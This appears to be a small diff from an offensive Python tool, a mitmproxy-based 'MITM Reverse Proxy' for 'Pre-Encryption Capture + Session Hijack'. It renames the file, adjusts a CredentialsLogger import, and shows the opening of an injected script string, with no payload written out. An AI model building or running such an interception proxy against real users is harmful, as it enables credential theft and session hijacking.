@@ -1,4 +1,4 @@
-# mim_proxy.py
+# mitm_reverse_proxy.py
 
 """
 MITM Reverse Proxy - Pre-Encryption Capture + Session Hijack
@@ -14,7 +14,7 @@ from mitmproxy import http
 from mitmproxy.options import Options
 from mitmproxy.tools.dump import DumpMaster
 
-from xphiltrate.mitm_auth_logger import CredentialsLogger
+from mitm_auth_logger import CredentialsLogger
 
 INJECTED_SCRIPT = """
 <script>
